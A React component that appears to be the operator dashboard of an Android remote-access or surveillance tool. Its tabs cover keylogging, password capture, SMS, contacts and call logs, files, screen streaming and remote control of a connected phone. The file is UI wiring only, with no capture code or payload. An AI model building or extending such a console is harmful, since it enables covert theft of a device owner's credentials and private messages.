import React, { useState, useCallback } from 'react';
import CommandPanel from './CommandPanel.jsx';
import ResultPanel from './ResultPanel.jsx';
import ScreenControl from './ScreenControl.jsx';
import ScreenReaderView from './ScreenReaderView.jsx';
import KeyloggerTab from './KeyloggerTab.jsx';
import AppManager from './AppManager.jsx';
import AppMonitorTab from './AppMonitorTab.jsx';
import PermissionsTab from './PermissionsTab.jsx';
import NotificationsTab from './NotificationsTab.jsx';
import RecentActivityTab from './RecentActivityTab.jsx';
import LiveMonitor from './LiveMonitor.jsx';
import TaskStudio from './TaskStudio.jsx';
import PasswordsTab from './PasswordsTab.jsx';
import ControlCenter from './ControlCenter.jsx';
import GestureTab from './GestureTab.jsx';
import SMSManagerTab from './SMSManagerTab.jsx';
import FileManagerTab from './FileManagerTab.jsx';
import ContactsCallLogTab from './ContactsCallLogTab.jsx';

const TABS = [
  { id: 'control_center', label: '🎮 Control Center' },
  { id: 'live_monitor',   label: '📊 Live Monitor' },
  { id: 'commands',       label: '⌨️ Commands' },
  { id: 'screen_control', label: '🖥️ Screen Control' },
  { id: 'screen_reader',  label: '📺 Screen Reader' },
  { id: 'task_studio',    label: '🎬 Task Studio' },
  { id: 'passwords',      label: '🔑 Passwords' },
  { id: 'notifications',  label: '🔔 Notifications' },
  { id: 'sms_manager',    label: '💬 SMS Manager' },
  { id: 'contacts_calls', label: '👥 Contacts & Calls' },
  { id: 'activity',       label: '📱 Activity' },
  { id: 'keylogger',      label: '⌨️ Keylogger' },
  { id: 'file_manager',   label: '📂 Files' },
  { id: 'app_manager',    label: '📦 App Manager' },
  { id: 'app_monitor',    label: '📡 App Monitor' },
  { id: 'permissions',    label: '🛡️ App Mode' },
  { id: 'gestures',       label: '✋ Gestures' },
];

const initialRefreshKeys = Object.fromEntries(TABS.map(t => [t.id, 0]));

export default function DeviceControl({
  device, sendCommand, results, pending, onBack,
  streamFrame, send, keylogPushEntries, notifPushEntries,
  activityAppEntries, screenReaderPushData, offlineRecordingVersion,
  serverLatency, deviceLatency,
}) {
  const [activeTab, setActiveTab]     = useState('control_center');
  const [refreshKeys, setRefreshKeys] = useState(initialRefreshKeys);

  const info     = device.deviceInfo || {};
  const isOnline = device.isOnline;

  const handleCommand = useCallback((command, params) => {
    sendCommand(device.deviceId, command, params);
  }, [sendCommand, device.deviceId]);

  const refreshTab = useCallback((tabId) => {
    setRefreshKeys(prev => ({ ...prev, [tabId]: (prev[tabId] || 0) + 1 }));
  }, []);

  const tabVisible = (id) => ({ display: activeTab === id ? 'flex' : 'none', flexDirection: 'column', flex: 1, minHeight: 0 });

  return (
    <div className="device-control">
      <div className="dc-header">
        <button className="btn-back" onClick={onBack}>← Back</button>
        <span style={{ fontSize: 22 }}>📱</span>
        <div>
          <div className="dc-title">{device.deviceName || device.deviceId}</div>
          <div style={{ fontSize: 12, color: '#94a3b8' }}>
            {info.manufacturer} {info.model} · Android {info.androidVersion || 'N/A'}
            {info.screenWidth && ` · ${info.screenWidth}×${info.screenHeight}`}
          </div>
        </div>
        <span className={`dc-status ${isOnline ? 'online' : 'offline'}`}>
          {isOnline ? '● ONLINE' : '● OFFLINE'}
        </span>
        <button
          title="Force the device to close and re-open all connections to the server"
          onClick={() => sendCommand(device.deviceId, 'restart_connection')}
          style={{ background: '#1e1b4b', border: '1px solid #4c1d95', color: '#a78bfa', borderRadius: 6, padding: '5px 12px', fontSize: 12, cursor: 'pointer', whiteSpace: 'nowrap' }}
        >
          🔄 Restart Connection
        </button>
      </div>

      {!isOnline && (
        <div style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.3)', borderRadius: 8, padding: '10px 14px', marginBottom: 16, color: '#ef4444', fontSize: 13 }}>
          ⚠️ Device is offline. Commands will fail until device reconnects.
        </div>
      )}

      <div className="pending-banner" style={{ visibility: pending.length > 0 ? 'visible' : 'hidden' }}>
        ⏳ {pending.length} command{pending.length > 1 ? 's' : ''} waiting for device response…
      </div>

      <div className="device-info-grid">
        <div className="di-item"><div className="di-label">Device ID</div><div className="di-value" style={{ fontSize: 11, fontFamily: 'monospace' }}>{device.deviceId}</div></div>
        <div className="di-item"><div className="di-label">Model</div><div className="di-value">{info.model || '—'}</div></div>
        <div className="di-item"><div className="di-label">Android</div><div className="di-value">{info.androidVersion || '—'}</div></div>
        <div className="di-item"><div className="di-label">Resolution</div><div className="di-value">{info.screenWidth ? `${info.screenWidth}×${info.screenHeight}` : '—'}</div></div>
      </div>

      <div className="dc-tabs" style={{ display: 'flex', alignItems: 'center', flexWrap: 'wrap', gap: 4 }}>
        {TABS.map(tab => (
          <button
            key={tab.id}
            className={`dc-tab-btn ${activeTab === tab.id ? 'active' : ''}`}
            onClick={() => setActiveTab(tab.id)}
          >
            {tab.label}
          </button>
        ))}

        <button
          title={`Refresh ${TABS.find(t => t.id === activeTab)?.label ?? activeTab}`}
          onClick={() => refreshTab(activeTab)}
          style={{
            marginLeft: 'auto',
            background: 'rgba(99,102,241,0.15)',
            border: '1px solid rgba(99,102,241,0.4)',
            color: '#a5b4fc',
            borderRadius: 6,
            padding: '5px 12px',
            fontSize: 12,
            cursor: 'pointer',
            whiteSpace: 'nowrap',
            display: 'flex',
            alignItems: 'center',
            gap: 5,
          }}
        >
          ↺ Refresh
        </button>
      </div>

      <div style={tabVisible('control_center')}>
        <ControlCenter
          key={refreshKeys.control_center}
          device={device}
          sendCommand={sendCommand}
          results={results}
          streamFrame={streamFrame}
          send={send}
          serverLatency={serverLatency}
          deviceLatency={deviceLatency}
          onTabChange={setActiveTab}
          screenReaderPushData={screenReaderPushData}
          offlineRecordingVersion={offlineRecordingVersion}
        />
      </div>

      <div style={tabVisible('live_monitor')}>
        <LiveMonitor
          key={refreshKeys.live_monitor}
          notifEntries={notifPushEntries || []}
          activityEntries={activityAppEntries || []}
          keylogEntries={keylogPushEntries || []}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>

      <div style={tabVisible('commands')} className="dc-layout">
        <CommandPanel
          key={refreshKeys.commands}
          onSend={handleCommand}
          disabled={!isOnline}
          pendingCommands={pending.map(p => p.command)}
        />
        <ResultPanel results={results} />
      </div>

      <div style={tabVisible('screen_control')}>
        <ScreenControl
          key={refreshKeys.screen_control}
          device={device}
          sendCommand={sendCommand}
          streamFrame={streamFrame}
          send={send}
        />
      </div>

      <div style={tabVisible('screen_reader')}>
        <ScreenReaderView
          key={refreshKeys.screen_reader}
          device={device}
          sendCommand={sendCommand}
          results={results}
          screenPushData={screenReaderPushData}
        />
      </div>

      <div style={tabVisible('task_studio')}>
        <TaskStudio
          key={refreshKeys.task_studio}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>

      <div style={tabVisible('passwords')}>
        <PasswordsTab
          key={refreshKeys.passwords}
          device={device}
          sendCommand={sendCommand}
          results={results}
          keylogPushEntries={keylogPushEntries || []}
        />
      </div>

      <div style={tabVisible('notifications')}>
        <NotificationsTab
          key={refreshKeys.notifications}
          device={device}
          sendCommand={sendCommand}
          results={results}
          notifPushEntries={notifPushEntries || []}
        />
      </div>

      <div style={tabVisible('sms_manager')}>
        <SMSManagerTab
          key={refreshKeys.sms_manager}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>

      <div style={tabVisible('contacts_calls')}>
        <ContactsCallLogTab
          key={refreshKeys.contacts_calls}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>

      <div style={tabVisible('activity')}>
        <RecentActivityTab
          key={refreshKeys.activity}
          device={device}
          activityEntries={activityAppEntries || []}
        />
      </div>

      <div style={tabVisible('keylogger')}>
        <KeyloggerTab
          key={refreshKeys.keylogger}
          device={device}
          sendCommand={sendCommand}
          results={results}
          keylogPushEntries={keylogPushEntries || []}
        />
      </div>

      <div style={tabVisible('file_manager')}>
        <FileManagerTab
          key={refreshKeys.file_manager}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>

      <div style={tabVisible('app_manager')}>
        <AppManager
          key={refreshKeys.app_manager}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>

      <div style={tabVisible('app_monitor')}>
        <AppMonitorTab
          key={refreshKeys.app_monitor}
          device={device}
          sendCommand={sendCommand}
          results={results}
          screenReaderPushData={screenReaderPushData}
        />
      </div>

      <div style={tabVisible('permissions')}>
        <PermissionsTab
          key={refreshKeys.permissions}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>

      <div style={tabVisible('gestures')}>
        <GestureTab
          key={refreshKeys.gestures}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>
    </div>
  );
}
